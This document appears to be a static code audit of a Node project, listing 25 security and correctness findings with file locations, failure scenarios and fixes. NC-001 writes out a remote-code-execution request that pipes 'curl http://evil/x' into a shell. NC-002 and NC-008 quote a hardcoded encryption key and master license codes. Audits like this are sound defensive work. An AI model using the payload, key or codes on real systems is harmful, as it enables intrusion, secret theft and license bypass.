# ncore bug audit (report only)

Role: ncore (V2 type), board row N1, split off P5. Binding doc: `docs_fix/REQUIREMENTS_20260927_TEAM_BUG_AUDIT.md`.
Scope: `ncore/`, root `main.js`, `ncore_module_caller.js`, `apps/` except `apps/mcp-chrome/`.
Method: static reading plus grep and `sed -n`. Nothing was executed. No code, config or doc was edited.
Prefix: NC. Severity order: most severe first. Line numbers are as read before 02:58 on 2026-09-27. No in-scope file was modified after 02:10 (checked at 02:58).

## Findings

### NC-001 — The ncore module caller exposes `POST /api/call` on 0.0.0.0:58000 with no auth and permissive CORS. It `require()`s any module path from the request body and calls any exported function with request-supplied args: unauthenticated remote code execution, reachable from the LAN and from any web page.
- severity: critical · category: security · confidence: confirmed
- location: `ncore/callmodule/app.js:168-243` (`/api/call`), `:41-46` (`cors({ origin: '*', credentials: true })`); `ncore/callmodule/global_config.js:38` (`host = '0.0.0.0'`), `:45` (`apiEnabled = true`), `:54,149-151` (`allowedModules = []` → "All modules allowed"); `ncore_module_caller.js:35` (`HOST: '0.0.0.0'`); `ncore/callmodule/platform/launcher.js:36,102`; `ncore/callmodule/platform/windows_tray.js:92,119`
- failure scenario: The user runs `node ncore_module_caller.js`. `ncore/utils/jsmcptools/mcp-server-stdio.js:183` tells MCP users to do exactly that, because the MCP Chrome server is started inside `createApp()` (`app.js:435-443`). Then any LAN host sends:
  `POST http://<victim>:58000/api/call {"module":"foundation/common/commander.js","function":"execCmd","args":["curl http://evil/x|sh"]}`.
  `path.join(config.ncoreRoot, module)` resolves inside ncore (`app.js:197-200`), and `execCmd` runs the string through the shell. Absolute paths are also accepted (`path.isAbsolute` branch). `GET /health` and `/api/status` disclose `ncoreRoot`. The preflight is answered with `*`, so a web page in the victim's browser can also send the JSON POST: a drive-by RCE.
  The same server exposes `page/evaluate` (JS in the logged-in browser profile, `ncontroller/routes/page_routes.js:95`), `document/downloadSite`, and `/api/singleton/shutdown`. The last one is an unauthenticated remote shutdown (`app.js:393-414`).
- evidence: `isModuleAllowed()` only checks `blockedModules`/`allowedModules`, and both are empty by default. There is no token, no origin check and no loopback bind. This is the Node twin of PR-001, with a stronger primitive: arbitrary `require` plus call.
- suggested fix: Bind 127.0.0.1 by default, require a shared-secret header, drop `/api/call` or restrict it to an explicit allow-list of module/function pairs, and replace `origin: '*'` with an allow-list.

### NC-002 — The master key that "encrypts" secrets is hardcoded in source, so every `ENC:` secret committed in `config/index.js` can be decrypted by anyone with the repository.
- severity: high · category: security · confidence: confirmed
- location: `ncore/global_vars/libs/config_tool.js:77-80` (`crypto.scryptSync('K8x#mP9$vL2@nQ5^wR7&jD3*fH6', 'core_node_salt', 32)`, AES-256-CBC, no MAC); secrets at `config/index.js:59,61,68,70,77,78` (`ADMIN_JWT_SECRET`, `JWT_SECRET`, `MYSQL_PWD`, `AZURE_SPEECH_KEY`, `STRAPI_TOKEN`, `GITEA_TOKEN`). `API_TOKEN_SALT` and `TRANSFER_TOKEN_SALT` are committed in plaintext because `needsEncryption` only matches `_pwd|_password|_key|_token|_secret`.
- failure scenario: Anyone with read access to the repo (a fork, a leaked clone, a CI log) calls `decryptValue()` with the committed key and gets the live JWT signing secrets, the DB password, the Azure speech key and the Gitea/Strapi tokens. With the JWT secrets they can mint admin tokens.
- evidence: `require('#@gconfig')` → `gconfig.js:32` `importConfigFromJs(config/index.js, true)` → `config_tool.js:461-470` decrypts every `ENC:` value with the static key → `setConfig` writes them back into `<data>/global_var/*` encrypted with the same key. No other end (pycore, shell, Laravel) knows the `ENC:` format; `grep` finds the key only in this file.
- suggested fix: Load the key from a per-machine secret outside the repo (for example the existing `#@secret_manager`), rotate every committed secret, and remove the `ENC:` blobs from `config/index.js`.

### NC-003 — `execPowerShell` builds `<pwsh path> -Command "<cmd>"` without quoting the executable or escaping inner quotes, so on Windows with PowerShell 7 installed every PowerShell call fails, and any command containing `"` fails on every Windows machine.
- severity: high · category: windows-compat · confidence: confirmed
- location: `ncore/foundation/common/commander.js:456-473,516` (prefers `C:\Program Files\PowerShell\7\pwsh.exe`); duplicate `ncore/global_vars/tool/common/cmder.js:201,223-229`; dead duplicate `ncore/utils/dev_tool/lang_deploy/libs/commander.js:326`
- failure scenario: `execCmd` runs the string through `cmd.exe` (`commander.js:237`). `C:\Program Files\PowerShell\7\pwsh.exe -Command "..."` makes cmd.exe run `C:\Program`, which is "not recognized". `execCmd` catches the error and returns `""`. The callers get empty output and silently misreport:
  - `global_vars/libs/system_info.js:155,205` (system info);
  - `utils/win_tool/libs/winstatus.js:52` (uptime; the command itself contains `ToString("yyyyMMddHHmmss")`, so it breaks even with Windows PowerShell 5);
  - `utils/win_tool/libs/sysinfo.js`, `utils/dev_tool/wsl-uitls/libs/wsl_activator.js:186` (WSL activation), `utils/dev_tool/utils/turn_feature.js:41`;
  - `global_vars/tool/soft-install/win-soft/software_finder.js:87` (software detection → reinstall loops).

  `dd.ps1:197` prefers `pwsh`, so PowerShell 7 is the normal state on these machines.
- evidence: `execPowerShell(cmd, info, cwd, no_std, cmdEnv)` also calls `execCmd(fullCommand, info, cwd, no_std, cmdEnv)`, but `execCmd` takes `(command, info, cwd, logname)`. So `no_std=true` writes to a log file named `true.log`, and `cmdEnv` is dropped.
- suggested fix: Spawn the PowerShell executable directly with an argv array (`spawnSync(psPath, ['-NoProfile','-Command', cmd])`) instead of going through cmd.exe string joining.

### NC-004 — Foundation `execCmd` treats a failing command as success when its output lacks "failure words", and `pipeExecCmd` never throws. Every caller that detects failure via try/catch or non-empty output gets false positives. Concretely, the Linux package installer reports "installed" for packages that are not installed.
- severity: high · category: correctness · confidence: confirmed
- location: `ncore/foundation/common/commander.js:251-260` (on a non-zero exit it returns `extraErrorStr(e)` = stdout+stderr if `checkCmdSuccess`), `:602-660` (`isSuccessOutput` returns `hasSuccess || !hasFailure`, i.e. true whenever no listed failure word appears), `:549-554` (`pipeExecCmd` returns `null` on failure); consumers `ncore/global_vars/tool/soft-install/linux-apt/package_manager.js:190-222,318-324`
- failure scenario:
  - `isInstalled('p7zip-full')` on a machine without it runs `dpkg -l p7zip-full`, which exits 1 with stderr `dpkg-query: no packages found matching p7zip-full`. No failure pattern matches ("no packages found" is not "not found"), so `execCmd` returns that text and `isInstalled` returns `true`.
  - `installPackage()` calls `await pipeExecCmd(updateCmd)` and `pipeExecCmd(installCmd)`. Both return `null` on failure (for example no network, or a dpkg lock held by another apt), so the `catch` blocks are dead. Verification uses `execCmd(checkCmd)` inside try/catch, which never throws, so every package is logged "Successfully installed" and the method returns `true`.
  - `smartInstaller.smartInstall('7zip')` (`ensure_7zip.js:57`) therefore believes 7-Zip was installed.
- evidence: `execSync` throws on a non-zero exit. The catch at `commander.js:251` calls `checkCmdSuccess(e)`, which for output without failure keywords returns true and keeps `resultText` as the result. Callers cannot distinguish the exit code.
- suggested fix: Return a structured `{ code, stdout, stderr }` (or keep the text API but return `""` on any non-zero exit). Drop the keyword heuristic, and have `package_manager` check exit codes.

### NC-005 — The shared HTTP RPC stack (`ExpressServer`/`expressProvider`) listens on 0.0.0.0 by default, answers every origin with `Access-Control-Allow-Origin: *`, and ships with auth disabled (PR-001 pattern on the Node side).
- severity: high · category: security · confidence: confirmed (exposure) / likely (impact depends on the routes an app registers)
- location: `ncore/global_vars/gconfig/rpc_constants.js:32` (`SERVER_HOST: '0.0.0.0'`), `ncore/global_vars/gconfig/rpc_config.js:5,7,27-33` (`AUTH_ENABLED: false`, `auth.enabled: false`), `ncore/utils/rpc/http_rpc/ExpressServer.js:77,84,99`, `ncore/utils/rpc/http_rpc/provider/expressProvider.js:41-51` (ACAO `*`, `OPTIONS *` → 200), `ncore/utils/rpc/http_rpc/HttpRpcServer.js:218` (auth check only when enabled), `:84,299-331` (`GET /rpc/query/:requestId` returns any cached response for 30 min with no session binding)
- failure scenario: An app built on `#@ncore/utils/rpc` (for example the ones started by `apps/*/main.js`) exposes every registered RPC route, the upload handler (`UploadTools.js`: 10 GB max file, originals kept by name) and the static roots (`/static`, `/uploads`, `/assets`, `wwwroot`, `shared-data`) to the LAN and to any web page.
  - Any LAN host can call any route.
  - `/rpc/query/<id>` returns other clients' cached results when the id is known or guessable (clients may choose their own `message.id`).
- evidence: `ExpressServer.start` → `serverHost = this.config.HTTP_HOST || '0.0.0.0'` → `server.listen(port, host)`. There is no auth middleware unless the app opts in.
- suggested fix: Default `HTTP_HOST` to 127.0.0.1 (explicit opt-in for LAN), enable a token by default when not loopback, reflect only allow-listed origins, and bind `/rpc/query` results to the requesting session.

### NC-006 — `RouterManager.api()` and `download()` send a second response after handlers that already responded. The second `res.json`/`res.send` throws `ERR_HTTP_HEADERS_SENT` inside the wrapper's `catch`, and the rejected promise goes unhandled (Express 4.22, Node 26, no handler installed). Each call kills the app process, including every voice-audio submission.
- severity: high · category: crash · confidence: confirmed
- location: `ncore/utils/rpc/http_rpc/libs/RouterManager.js:225-244` (`api()`: `res.json(processResponse(result))` after the handler, then `res.status(500).json(...)` in `catch`), `ncore/utils/rpc/http_rpc/libs/file_query.js:336-353` (`download()`: `res.status(404).send()` after a handler that already sent 403/404, then `res.status(500).send()` in `catch`)
- failure scenario:
  - VoiceClientAndCaddy: `/submit_audio`, `/submit_audio_simple` (`http_controller/dict_server.js:134-187,189-238`) and `/get_diff_audio_table` (`sync_audio.js:26-40`) call `res.json()` themselves and return `undefined` (`apps/VoiceClientAndCaddy/http/router.js:54-67`).
  - WebLocalAreaNetwork: `/check-file`, `/upload`, `/upload-dirs`, `/upload-dir-list` (`http/router.js:28-50`) and `/api/list` (`download.listDir`) respond inside the handler.
  - `/api/download?file=/nope` → `downloadFile` sends 404 and returns `null` → `validateFilePath(null)` invalid → `res.status(404).send()` throws → the catch throws again.

  In every case: the first response reaches the client, then the async wrapper rejects. Neither app loads `thread_bus` (the only module that installs `unhandledRejection` is `getThreadBus()`, which only callmodule/ncontroller call), so Node's default `--unhandled-rejections=throw` terminates the process. Any LAN host can repeat a single GET to keep the server down.
- evidence: Express 4 `res.send` → `this.set('Content-Length')` → `OutgoingMessage.setHeader` throws once headers are sent. The `catch` in `api()` calls `res.status(500).json` again, which throws out of the async function. `package.json` pins `express ^4.21.2`; the installed version is 4.22.1.
- suggested fix: In the wrappers, skip writing when `res.headersSent`, and wrap async handlers so rejections reach `next(err)`.

### NC-007 — WebLocalAreaNetwork serves every file under `<repo>/../../` (for example `/www/` or `D:\www\`) to 0.0.0.0:3900 with no auth, and its containment check is a string-prefix test that sibling directories bypass.
- severity: high · category: security · confidence: confirmed
- location: `apps/WebLocalAreaNetwork/config/index.js:21` (`ALLOW_DOWNLOAD_DIR = path.join(gdir.rootdir, '../../')`), `:135-136` (`HTTP_HOST: '0.0.0.0'`), `apps/WebLocalAreaNetwork/http/index.js:25-31` (`auth: { enabled: false }`), `apps/WebLocalAreaNetwork/http_controller/download.js:69-90` (`normAbsFile.startsWith(normRoot)`), `:18-27` (the same check in `listDir`); `update.js` `resolveUploadDir` uses the same prefix test against `WWWROOT_DIR`
- failure scenario: The repo lives at `/www/programing/core_node` (dual-boot `D:\www\programing\core_node`). `GET http://<host>:3900/api/download?file=/core_node/global_var/<TAG>_<KEY>` downloads the cross-language var center. Its `*_PASSWORD`/`*_TOKEN` values are `ENC:` blobs decryptable with the NC-002 key. Other repos' `.env` files, `laravel_main/.env`, SSH configs under `/www` and so on are reachable the same way. `SKIP_DIRS` only filters directory listings; downloads are not filtered. With a sibling path such as `ALLOW_DOWNLOAD_DIR=/www/` → `/www_backup/...` the prefix test passes for directories outside the root.
- evidence: `path.resolve(ALLOW_DOWNLOAD_DIR, '.' + file)` followed by a plain `startsWith` (no `path.sep` suffix, no `realpath`) → `routerManager.download('/api/download', download.downloadFile)` (`http/router.js:54`) → `file_query.handleFileDownload` streams the file.
- suggested fix: Scope the root to an explicit share directory, bind loopback or require a token, and check containment with `path.relative` plus `realpath` (no leading `..`).

### NC-008 — The dingdoudou extension ships three hardcoded master license codes and the public signing salt, so anyone can unlock the unlimited "super" license offline or mint new codes.
- severity: high · category: security · confidence: confirmed
- location: `apps/dingdoudou/lib/superCode.ts:17` (`SUPER_SALT = 'dingduoduo::supercode::v1'`), `:20-24` (`MASTER_CODES`: `DDK-MASTER-0000`, `DINGDUODUO-VIP`, `DDK-SUPER-FOREVER`), `:36-48` (`mintSuperCode`, a 32-bit FNV-1a "signature" truncated to 24 bits), `:52-59` (`verifySuperCode`), `:62-73` (`superLicense`: `features: ['*']`, `maxBinds: MAX_SAFE_INTEGER`, `expiresAt: null`)
- failure scenario: A user unpacks the extension, types `DDK-SUPER-FOREVER`, and gets every paid feature with unlimited Pinduoduo account binds and no backend check. Anyone can also compute `DDK-ANY-<sig>` locally. Paid membership (`recharge/*` in `backendClient.ts`) is bypassed.
- evidence: `backendClient.ts:1` says the backend is used "ONLY when there is no super-code". The salt is mirrored in `poly_apps/laravel_main/app/Apps/DingDuoDuoV1/DingDuoDuoV1Services/DingDuoDuoV1SuperCodeService.php:22` (cross-scope, see below).
- suggested fix: Replace the shared-salt checksum with an asymmetric signature (a server-held private key, with only the public key shipped), drop the master codes, and bind codes to a device id plus expiry.

### NC-009 — Voice `submit_audio_simple` always fails: `watcher` is a local string constant, so `watcher.addToIndex(...)` throws `TypeError` after the first file is copied, and the uploaded temp file is not deleted.
- severity: medium · category: correctness · confidence: confirmed
- location: `apps/VoiceClientAndCaddy/http_controller/dict_server.js:190-191,203,212`
- failure scenario: A voice client submits a finished recording to `/submit_audio_simple`. The file is copied to `voiceDir`. `'DICT_SOUND_WATCHER'.addToIndex` is not a function, so `forEach` aborts and `deleteFile(file.path)` is skipped for that file and all remaining files. The handler returns 500, and then NC-006 kills the server.
- evidence: `const DICT_SOUND_WATCHER = \`DICT_SOUND_WATCHER\`;` shadows any module watcher; `const watcher = fields.type == ITEM_TYPE.WORD ? DICT_SOUND_WATCHER : SENTENCES_SOUND_WATCHER;`.
- suggested fix: Import the real watcher instances (the ones used by `server_voice_load`) instead of string names.

### NC-010 — `SingleInstanceManager` can let two instances run: acquisition is a non-atomic check-then-write, the stale threshold is only 1 s above the heartbeat period, heartbeats overwrite the lock unconditionally, and `releaseLock()` deletes the file without checking ownership.
- severity: medium · category: race · confidence: confirmed
- location: `ncore/utils/mcp_server/SingleInstanceManager.js:61-62` (`heartbeatInterval 5000`, `staleThreshold 6000`), `:276-307` (`acquireLock`: `readLockFile` → `writeFileSync`, no `wx`), `:137-148` (`updateHeartbeat` rewrites the lock with its own pid), `:201-212` (`releaseLock` unlinks whatever file is there)
- failure scenario:
  1. Instance A blocks its event loop for more than 1 s (for example an `ffinder` scan, NC-016, or any `execSync`), or the laptop sleeps.
  2. Instance B sees a stale lock, deletes it and writes its own. Five seconds later A's heartbeat overwrites B's lock, and both believe they hold it.
  3. When either exits it unlinks the other's lock, so a third instance can start.

  Two MCP servers started at the same moment both pass `readLockFile() === null` and both write.
- evidence: There is no `O_EXCL`, no pid-liveness check (`process.kill(pid, 0)`) and no ownership comparison before `unlinkSync`.
- suggested fix: Create with `fs.openSync(path, 'wx')`, check pid liveness instead of a 1 s timing margin, and compare `lockData.pid === process.pid` before rewriting or unlinking.

### NC-011 — On a Windows machine without a writable `D:` drive, every ncore entry point crashes at module load: `system_paths.js` falls back to the unusable `D:\www\core_node`, then creates subdirectories without a guard.
- severity: medium · category: windows-compat · confidence: confirmed
- location: `ncore/foundation/common/system_paths.js:283-303` (Windows candidates = `[D:\www\core_node]` only; after failure `_systemCacheDir = preferredDir`), `:434-439` (module-level `getUiStateCacheDir()` etc. → unguarded `fs.mkdirSync` throws `ENOENT`); `ncore/global_vars/global_dir/globaldir.js:83-84,131,171-173` (`DATA_DRIVER = 'D:\\'` unconditionally; `mkdir` only swallows `EACCES/EPERM`, not `ENOENT`)
- failure scenario: On a laptop with only `C:` (or with `D:` as a DVD drive), `require('#@commander')` → `system_paths` → throws → `main.js`, `ncore_module_caller.js` and every app die before logging anything useful. The only workaround is the undocumented `CORE_NODE_DATA_DIR` env var. `config/index.js:41` falls back to `C:\` for the same case, so `DEV_LANG_DIR` (`C:\…`) and `LANG_COMPILER_DIR` (`D:\…`) disagree.
- evidence: See the lines above. pycore `core_node_dirs.py:153-154` has the same Windows-only candidate, but its failure is local to the call, not at import.
- suggested fix: Add a user-writable Windows fallback (for example `%LOCALAPPDATA%\core_node`), guard the module-level mkdirs, and derive `DATA_DRIVER` from the same resolved root.

### NC-012 — `package_manager.remove()` runs `<install command> remove <pkg>` (for example `sudo apt install -y remove foo`), so it never removes anything, yet it reports success. `purge()` on non-apt managers delegates to it.
- severity: medium · category: correctness · confidence: confirmed
- location: `ncore/global_vars/tool/soft-install/linux-apt/package_manager.js:234-249` (`${manager.commands.install} remove ${packageName}`), `:252-264` (purge fallback); command map `pmanager_map.js:48-54` (`install: 'apt install -y'`)
- failure scenario: `remove('nginx')` runs `sudo apt install -y remove nginx`, which fails with "Unable to locate package remove". Foundation `pipeExecCmd` returns `null` instead of throwing (NC-004), so the method logs "removed successfully" and returns `true`. With `apk`/`opkg` the result is `apk add remove nginx` / `opkg install remove nginx`.
- evidence: The map has no `remove` command. `pipeExecCmd` never throws.
- suggested fix: Add a per-manager `remove` command (`apt-get remove -y`, `apk del`, `opkg remove`, `dnf remove -y`) and check the exit status.

### NC-013 — RPC sessions leak without bound: HTTP RPC creates a session per distinct client id and nothing ever calls `SessionManager.cleanup()`, and the WS close handler deletes the client entry before reading its `sessionId`, so WS sessions are never removed either.
- severity: medium · category: leak · confidence: confirmed
- location: `ncore/utils/rpc/http_rpc/HttpRpcServer.js:201-206` (`createSession(message.clientId || …)`, `addToGroup`), `ncore/utils/rpc/common/session_manager.js` (`cleanup(maxAge)` exists; grep finds no caller), `ncore/utils/rpc/ws_rpc/WsRpcServer.js:406-418` (`this.clients.delete(actualClientId)` at `:410`, then `this.clients.get(clientId)` at `:414` → always `undefined`)
- failure scenario: A long-running app on 0.0.0.0 (NC-005) receives requests with random `clientId` values (or plain browser traffic, which keys sessions by remote IP). The `sessions`/`groups` maps grow forever, and each session also holds a `requests` Map. Reconnecting WS clients leak one session per connection. Memory grows until an OOM restart.
- evidence: The line refs above. `ResponseCache` does have a cleanup timer; `SessionManager` does not.
- suggested fix: Start a `cleanup()` interval in `SessionManager`, read `clientInfo` before deleting it in the WS close handler, and cap client-chosen ids.

### NC-014 — Several modules register SIGINT/SIGTERM handlers that call `process.exit()` synchronously, which cuts off the async graceful shutdowns registered by others (ThreadBus services, the MCP server, the browser).
- severity: medium · category: lifecycle · confidence: confirmed
- location: `ncore/utils/mcp_server/SingleInstanceManager.js:322-330` (sync `cleanup(); process.exit(0)`), registered inside `acquireLock()` before `DualModeRunner.js:157-171` adds its async `cleanupHandler` (`await this.mcpServer.shutdown()`); `ncore/callmodule/platform/launcher.js:107-115` (`process.exit(0)`), registered after `createApp()` has created the ThreadBus (`app.js:371-372` → `thread_bus.js:48-49,62-66`, async `shutdown()`)
- failure scenario: Ctrl+C or `systemctl stop` on an MCP server started through `DualModeRunner`: SingleInstanceManager's handler runs first and exits, so `mcpServer.shutdown()` never runs. On the ncore module caller, ThreadBus starts `shutdown()`, and then the launcher handler exits immediately. `ncoreController`'s browser and ThreadBus services are not closed, which leaves orphaned Edge/Chrome processes and unflushed state.
- evidence: Node invokes signal listeners synchronously in registration order. `process.exit` inside a listener prevents pending promises from continuing.
- suggested fix: Keep one shutdown coordinator (ThreadBus) and let every other module register an async hook with it instead of calling `process.exit`.

### NC-015 — Settings writes lose data: `settings.json` is rewritten non-atomically; a failed parse (for example a concurrent half-written file) returns `{}` and the next `setKey` persists only that key; and `SettingsCenter` saves its stale in-memory cache over newer on-disk changes.
- severity: medium · category: data-loss · confidence: likely
- location: `ncore/global_vars/libs/user_settings.js:58-80` (`loadSettings` → `{}` on parse error; `saveSettings` = `writeFileSync`), `:105-110` (`setKey` = load → mutate → save), `:228-249`; `ncore/utils/state_center/index.js:338-378` (`this.cache` loaded once; `set()` → `saveSettings(this.cache)`)
- failure scenario:
  - Two processes (for example an Electron app using `SettingsCenter` and a CLI app using `userSettings.setKey`) both write `settings.json`. Process B's `setKey` reads a truncated file mid-write, gets `{}`, and writes back one key: every other setting is wiped.
  - Independently, `SettingsCenter.set()` overwrites keys another process added after the cache was loaded.
- evidence: There is no temp-file-plus-rename, no lock and no re-read before save. `syncToFile(key, value)` also writes `String(value)`, which is `"[object Object]"` for objects.
- suggested fix: Write via a temp file plus `rename`, refuse to save after a parse failure, and have `SettingsCenter` re-read and merge before saving.

### NC-016 — `ffinder` performs a fully synchronous recursive scan (`readdirSync`/`realpathSync`) inside `async` functions, so its "20 second timeout" can never fire and the whole process blocks for the duration. It also walks every directory twice (`countDirs` exists only for statistics).
- severity: medium · category: performance · confidence: confirmed
- location: `ncore/global_vars/tool/common/ffinder.js:228-284` (`searchFileInDirectory`), `:306-324,334-352` (`setTimeout(…, 20000)` race), `:413-437,552-576` (`countDirs` pre-walk), `:374-392` (Windows roots include all of `C:\Program Files*`, `D:\Program Files*` and every `PATH` entry at depth 3)
- failure scenario: `ensure_7zip` → `findExecutable('7z')` → `findByCommonInstallDir` on Windows walks `Program Files` and `PATH` to depth 3, twice, synchronously. For many seconds (minutes on slow disks) HTTP servers stop responding, WS heartbeats time out, and `SingleInstanceManager` heartbeats stop, which triggers the NC-010 takeover. The timeout callback is a macrotask and cannot run until the scan finishes.
- evidence: `await search(...)` resolves synchronously (no I/O await), so there is no macrotask turn.
- suggested fix: Use `fs.promises.readdir` (or a worker) with a real abort signal, and drop the `countDirs` pre-walk.

### NC-017 — `winget.configureSource()` removes the default `winget` source, then adds the USTC mirror, and records "configured" regardless of the outcome. If the add fails, winget is left with no main source and the code never retries.
- severity: medium · category: correctness · confidence: confirmed
- location: `ncore/global_vars/tool/soft-install/winget/winget.js:106-131` (`remove`, `add`, then `saveSourceConfig()`), `:83-94` (`isSourceConfigured` short-circuits on the cache file)
- failure scenario: The machine is offline, or the mirror is down, when `configureSource()` runs. `winget source remove winget` succeeds, `winget source add … --trust-level trusted` fails, and `cmder.execCmdResultText` swallows the error and returns `""` (the `try/catch` is dead). `winget_source.json` gets `{configured:true}`. Every later `winget install` fails with "no sources"; the only fix is deleting the cache file by hand.
- evidence: `execCmdResultText` in `global_vars/tool/common/cmder.js:81-111` never throws.
- suggested fix: Check the output of `source list` after the add, and only then persist `configured`. On failure, `winget source reset --force`.

### NC-018 — `wrapEmdResult` and `wrapTextResult` overwrite `error` with `stdout`, so every async command result (`execCommand`, `spawnAsync`) loses stderr and reports stdout as the error text.
- severity: medium · category: correctness · confidence: confirmed
- location: `ncore/foundation/common/commander.js:171-184` (`error = byteToStr(stdout);`), `:217-225`; the same in dead copy `ncore/utils/dev_tool/lang_deploy/libs/commander.js:100-113`
- failure scenario: `spawnAsync('pip install x')` fails with a resolver error on stderr. The caller gets `{success:false, error:<stdout>}`, logs misleading text, and never sees the real error. `spawnAsync(…,'error')` passes an `Error` object as stderr, which is also dropped.
- evidence: Line 173 assigns from `stdout`, not `error`.
- suggested fix: `error = byteToStr(error)`.

### NC-019 — The edge-tts command line is built by string interpolation: the binary path is unquoted, and `queueItem.content` sits inside `"…"`. Text containing `"`, `$(...)`, backticks or `%VAR%` breaks generation or runs shell code. Failed generations are still reported as generated.
- severity: medium · category: security · confidence: likely
- location: `apps/VoiceClientAndCaddy/basetool/ptools/edge_tts_py.js:122-126` (`${edgeTTSBinary} --voice … --text "${queueItem.content}" …` → `execCommand`); identical copy in `apps/WebLocalAreaNetwork/basetool/ptools/edge_tts_py.js`
- failure scenario:
  - A sentence item `He said "stop"` splits the argv, so edge-tts errors.
  - `$(…)` in a sentence (the word lists come from the server and book imports) executes via `/bin/sh -c` on Linux.
  - A Windows user profile path with a space (`C:\Users\A B\…\edge-tts.exe`) fails for every item.

  In all cases foundation `execCommand` resolves `{success:false}` instead of rejecting, and line 126 pushes `mediaFilename` into `generatedWordFiles` anyway, so callers count a missing file as done.
- evidence: `execCommand` → `spawnSync(shell, ['-c', command])` (`commander.js:340-373`).
- suggested fix: `spawn(edgeTTSBinary, ['--voice', v, '--text', content, '--write-media', m, '--write-subtitles', s])`, and check `success`.

### NC-020 — The MCP Chrome HTTP server enables CORS for `*` on its loopback endpoint, so any web page open in the user's browser can call the browser-automation tools through `http://127.0.0.1:<mcp_chrome>/mcp`.
- severity: medium · category: security · confidence: likely
- location: `ncore/utils/jsmcptools/server.js:52` (host `127.0.0.1`), `:67-69` (`register(cors, { origin: '*' })`), started from `ncore/callmodule/app.js:435-443`
- failure scenario: A malicious page runs `fetch('http://127.0.0.1:<port>/mcp', {method:'POST', headers:{'content-type':'application/json'}, body: <tools/call get_web_content …>})`. The preflight is allowed by `origin: '*'`, so the page can read content from other tabs and drive navigation in the logged-in profile. Browsers without Local-Network-Access prompts (Firefox, older Chromium) do not block this. DNS rebinding also reaches it, because there is no Host check.
- evidence: `@fastify/cors` with `origin: '*'` answers every preflight. There is no token.
- suggested fix: Restrict origins to the extension id and localhost UI, validate `Host`, and require a bearer token.

### NC-021 — The placeholder-image MCP server is a FastMCP stdio server, yet it writes 164 `print()` lines (and `pip install` output) to stdout, the JSON-RPC channel, so MCP clients receive non-protocol lines interleaved with responses.
- severity: medium · category: protocol · confidence: confirmed (stdout use) / likely (client impact varies)
- location: `ncore/mcp_server/placeholder_image_generator/main.py:1969` (`mcp.run()` = stdio transport), prints at for example `:277` (`[INIT] …` on construction), `URLRateLimiter.wait_if_needed` (`[RATE_LIMITER] …` on every fetch), `main()`/`init()` (`:1308-1320,1981-2000`), and `PackageManager.install_package` (`:47-55`, `subprocess.check_call([... pip install ...])` inheriting stdout). The file has no redirect to stderr; `unifiedmcp/main.py` does redirect.
- failure scenario: An AI client (Claude Code, Codex) calls `generate_placeholder`. Lines like `[API_CALL] Calling 'unsplash_search'...` arrive on the same stream as the JSON-RPC reply. Strict clients drop the connection ("invalid JSON"), and lenient ones log parse errors. When a package is missing at start, pip's progress output precedes the `initialize` response. `image.save(normalized_path, 'JPEG')` (`:858`) also writes JPEG bytes into `.png`/`.gif`/`.webp` paths that `_validate_and_normalize_path` accepts (`:338-340`), which breaks consumers that trust the extension (for example Android aapt2).
- evidence: `grep -c 'print(' main.py` → 164, `file=sys.stderr` → 0.
- suggested fix: Route all diagnostics to stderr (logging to stderr), run pip with `stdout=sys.stderr`, and save in the format implied by the extension.

### NC-022 — `node main.js app=<x> --service` always crashes: `main.js` calls `installService()` with no argument, and `installService(config)` destructures `config` right away.
- severity: medium · category: crash · confidence: confirmed
- location: `main.js:170-172` (`await this.installService();`), `ncore/utils/linux/libs/service.js:278-285` (`let { execPath, entry = '', … } = config;`); also `:294-296` (logs "Service name and execPath are required" but does not return), `:229-266` (every unit is `User=root` with `PATH=/usr/local/bin:/usr/bin:/bin`, and carries the journald-only keys `LogsMaxSize`, `MaxRetentionSec`, `MaxFileSec`, which systemd rejects as unknown in `[Service]`)
- failure scenario: A user installs an app as a service (the `isService` flag from `#@global_vars`). The process throws `TypeError: Cannot destructure property 'execPath' of 'undefined'` → `main.start().catch` → exit 1, and no unit is written. On Windows the same path would write to `/etc/systemd/system` with no platform guard.
- evidence: `service.js:394-395` exports this `installService` unchanged, and `main.js:155` binds it directly.
- suggested fix: Build the config in `main.js` (`{ name: appname, execPath: process.execPath, entry: main.js path, args }`), return early on missing fields, and gate by platform.

### NC-023 — `DeepSeekTranslator` parses JSON responses per stdout `data` chunk, so a response line split across chunks is dropped and the request silently times out. One bad line also aborts parsing of the rest of the chunk.
- severity: low · category: correctness · confidence: likely
- location: `ncore/utils/stream_translator/libs/DeepSeekTranslator.js:90-104,126-151`
- failure scenario: A long translation (a JSON line over the 64 KiB pipe chunk) arrives in two chunks. Neither fragment starts with `{` and ends with `}`, so it is ignored. After `timeout` (30 s) `translate()` resolves with the untranslated text. Default `pythonCommand: 'python'` (`:24`, `TranslatorAPI.js:236`) does not exist on Debian/Kali (only `python3`), so `start()` fails there unless configured.
- evidence: `handleModelOutput(output)` is called with the raw chunk, with no line buffer.
- suggested fix: Keep a carry-over buffer and split on `\n`. Default to `python3` on POSIX.

### NC-024 — `importConfigFromJs` rewrites the tracked `config/index.js` source at runtime, using `content.replace(plaintext, ENC)`, which replaces the first textual occurrence anywhere in the file, not the key's value.
- severity: low · category: data-corruption · confidence: confirmed
- location: `ncore/global_vars/libs/config_tool.js:449,461-479`; triggered on every `require('#@gconfig')` (`ncore/global_vars/tool/gconfig.js:32-33`)
- failure scenario: A developer adds `MYSQL_USER: 'root', MYSQL_PWD: 'root'`. The first process start replaces the first `'root'` (the user) with an `ENC:` blob and leaves the password in plaintext. `MYSQL_USER` is not in `needsEncryption`, so it is then read back as the literal `ENC:…` string and DB login breaks. Starting any app also silently modifies a git-tracked file, and every start re-encrypts all secrets into `global_var` with fresh IVs.
- evidence: `content.replace(value, encryptedValue)` with a string pattern.
- suggested fix: Never write source files at runtime. Keep secrets outside the repo (see NC-002).

### NC-025 — `StaticPathResolver` on a Linux desktop (non-WSL) computes a different web root from every other end: `/opt/www/…` when running as root, or `/www/www/…` on a native (non-NTFS) `/www`.
- severity: low · category: contract-mismatch · confidence: confirmed
- location: `ncore/utils/rpc/http_rpc/libs/StaticPathResolver.js:63-80` (desktop picks the first writable of `/mnt/data`, `/opt`, `/home`, else `/www`), `:105-163` (`path.join(baseDir, 'www', 'wwwroot')`), `:86-98` (`getCoreNodeProjectRoot` → `/opt/programing/core_node`)
